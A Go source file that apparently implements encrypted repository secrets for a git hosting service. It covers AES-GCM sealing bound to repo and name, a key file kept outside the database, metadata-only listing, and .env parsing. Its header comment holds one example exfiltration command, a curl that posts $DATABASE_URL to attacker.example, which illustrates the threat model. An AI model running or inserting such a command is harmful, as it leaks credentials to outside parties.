package main

// Repository secrets: the values a branch needs to actually run — database
// URLs, API keys — held encrypted at rest and injected into Preview
// Environments as environment variables.
//
// The honest boundary: a Preview Environment executes the branch's own code,
// so every secret injected is readable by anyone who can push to the
// repository. Encryption protects the values on disk and in backups, and
// write-only APIs keep them out of the browser and the logs — but nothing
// here can stop `run: curl attacker.example -d "$DATABASE_URL"`. Scope the
// secrets accordingly: a preview-only database, never production credentials.

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
)

type Secret struct {
	ID        int64
	RepoID    int64
	Name      string
	UpdatedBy int64
	UpdatedAt int64
	// Value is deliberately absent: nothing outside decryptSecrets ever holds
	// a plaintext, so no handler can leak one by accident.
}

// ---------- the key ----------

var (
	secretKeyOnce sync.Once
	secretKey     []byte
	secretKeyErr  error
)

// repoSecretKey returns the AES-256 key, from GITGIT_SECRET_KEY if set and
// otherwise from a 0600 file next to the database — generated on first use.
//
// The key lives outside the database on purpose: a leaked copy of gitgit.db,
// or a backup of it, is then not enough to read anything.
func repoSecretKey() ([]byte, error) {
	secretKeyOnce.Do(func() {
		if env := strings.TrimSpace(os.Getenv("GITGIT_SECRET_KEY")); env != "" {
			key, err := decodeKey(env)
			if err != nil {
				secretKeyErr = fmt.Errorf("GITGIT_SECRET_KEY: %w", err)
				return
			}
			secretKey = key
			return
		}
		path := filepath.Join(dataDir, "secret.key")
		raw, err := os.ReadFile(path)
		if err == nil {
			secretKey, secretKeyErr = decodeKey(strings.TrimSpace(string(raw)))
			return
		}
		if !os.IsNotExist(err) {
			secretKeyErr = err
			return
		}
		key := make([]byte, 32)
		if _, err := rand.Read(key); err != nil {
			secretKeyErr = err
			return
		}
		if err := os.WriteFile(path, []byte(hex.EncodeToString(key)+"\n"), 0o600); err != nil {
			secretKeyErr = err
			return
		}
		secretKey = key
	})
	return secretKey, secretKeyErr
}

// resetSecretKey drops the cached key so a test can change the environment.
func resetSecretKey() {
	secretKeyOnce = sync.Once{}
	secretKey, secretKeyErr = nil, nil
}

func decodeKey(s string) ([]byte, error) {
	if b, err := hex.DecodeString(s); err == nil && len(b) == 32 {
		return b, nil
	}
	if b, err := base64.StdEncoding.DecodeString(s); err == nil && len(b) == 32 {
		return b, nil
	}
	return nil, errors.New("must be 32 bytes, hex or base64 encoded")
}

// ---------- encryption ----------

// sealSecret encrypts with AES-256-GCM, binding the ciphertext to the
// repository and name so a row cannot be moved to another repository — or
// renamed to shadow a different variable — without detection.
func sealSecret(repoID int64, name, value string) (string, error) {
	key, err := repoSecretKey()
	if err != nil {
		return "", err
	}
	gcm, err := newGCM(key)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}
	sealed := gcm.Seal(nonce, nonce, []byte(value), secretAAD(repoID, name))
	return base64.StdEncoding.EncodeToString(sealed), nil
}

func openSecret(repoID int64, name, stored string) (string, error) {
	key, err := repoSecretKey()
	if err != nil {
		return "", err
	}
	gcm, err := newGCM(key)
	if err != nil {
		return "", err
	}
	raw, err := base64.StdEncoding.DecodeString(stored)
	if err != nil || len(raw) < gcm.NonceSize() {
		return "", errors.New("secret is corrupt")
	}
	plain, err := gcm.Open(nil, raw[:gcm.NonceSize()], raw[gcm.NonceSize():], secretAAD(repoID, name))
	if err != nil {
		return "", errors.New("secret cannot be decrypted with the current key")
	}
	return string(plain), nil
}

func newGCM(key []byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}

func secretAAD(repoID int64, name string) []byte {
	return []byte(fmt.Sprintf("gitgit-secret:%d:%s", repoID, name))
}

// ---------- storage ----------

// validSecretName keeps names to what a shell can actually export.
func validSecretName(name string) bool {
	if name == "" || len(name) > 128 {
		return false
	}
	for i, r := range name {
		switch {
		case r >= 'A' && r <= 'Z', r == '_':
		case r >= 'a' && r <= 'z':
		case r >= '0' && r <= '9' && i > 0:
		default:
			return false
		}
	}
	return true
}

func setSecret(repoID, userID int64, name, value string) error {
	if !validSecretName(name) {
		return fmt.Errorf("%q is not a usable variable name", name)
	}
	sealed, err := sealSecret(repoID, name, value)
	if err != nil {
		return err
	}
	_, err = db.Exec(`INSERT INTO repo_secrets (repo_id, name, sealed, updated_by, updated_at)
		VALUES (?,?,?,?,?)
		ON CONFLICT(repo_id, name) DO UPDATE SET sealed = excluded.sealed,
			updated_by = excluded.updated_by, updated_at = excluded.updated_at`,
		repoID, name, sealed, userID, now())
	return err
}

func deleteSecret(repoID int64, name string) {
	db.Exec("DELETE FROM repo_secrets WHERE repo_id = ? AND name = ?", repoID, name)
}

// listSecrets returns names and metadata only. There is deliberately no API
// that returns a value: a secret goes in, and comes out only inside a build.
func listSecrets(repoID int64) []*Secret {
	rows, err := db.Query("SELECT id, repo_id, name, updated_by, updated_at FROM repo_secrets WHERE repo_id = ? ORDER BY name", repoID)
	if err != nil {
		return nil
	}
	defer rows.Close()
	out := []*Secret{}
	for rows.Next() {
		s := &Secret{}
		if rows.Scan(&s.ID, &s.RepoID, &s.Name, &s.UpdatedBy, &s.UpdatedAt) == nil {
			out = append(out, s)
		}
	}
	return out
}

// secretEnv decrypts a repository's secrets into KEY=VALUE form for a build.
// A secret that cannot be decrypted is skipped with a note rather than
// failing the build, so rotating the key does not brick every preview.
func secretEnv(repoID int64) (pairs []string, values []string, skipped []string) {
	rows, err := db.Query("SELECT name, sealed FROM repo_secrets WHERE repo_id = ? ORDER BY name", repoID)
	if err != nil {
		return nil, nil, nil
	}
	defer rows.Close()
	for rows.Next() {
		var name, sealed string
		if rows.Scan(&name, &sealed) != nil {
			continue
		}
		value, err := openSecret(repoID, name, sealed)
		if err != nil {
			skipped = append(skipped, name)
			continue
		}
		pairs = append(pairs, name+"="+value)
		values = append(values, value)
	}
	return pairs, values, skipped
}

// ---------- .env parsing ----------

// parseDotenv reads a pasted .env file. Deliberately conservative: it handles
// what real .env files contain (comments, `export`, quoting, escaped newlines
// inside double quotes) and reports lines it cannot make sense of instead of
// guessing at them.
func parseDotenv(text string) (map[string]string, []string) {
	out := map[string]string{}
	var bad []string
	for n, line := range strings.Split(text, "\n") {
		line = strings.TrimSpace(strings.TrimSuffix(line, "\r"))
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		line = strings.TrimPrefix(line, "export ")
		key, value, ok := strings.Cut(line, "=")
		if !ok {
			bad = append(bad, fmt.Sprintf("line %d", n+1))
			continue
		}
		key = strings.TrimSpace(key)
		if !validSecretName(key) {
			bad = append(bad, fmt.Sprintf("line %d (%q)", n+1, trimForMessage(key)))
			continue
		}
		out[key] = unquoteEnvValue(strings.TrimSpace(value))
	}
	names := make([]string, 0, len(out))
	for k := range out {
		names = append(names, k)
	}
	sort.Strings(names)
	return out, bad
}

func unquoteEnvValue(v string) string {
	if len(v) >= 2 && v[0] == '"' && v[len(v)-1] == '"' {
		inner := v[1 : len(v)-1]
		inner = strings.ReplaceAll(inner, `\n`, "\n")
		inner = strings.ReplaceAll(inner, `\"`, `"`)
		return inner
	}
	if len(v) >= 2 && v[0] == '\'' && v[len(v)-1] == '\'' {
		return v[1 : len(v)-1]
	}
	// an unquoted value ends at an inline comment
	if i := strings.Index(v, " #"); i >= 0 {
		v = strings.TrimSpace(v[:i])
	}
	return v
}

func trimForMessage(s string) string {
	if len(s) > 24 {
		return s[:24] + "…"
	}
	return s
}
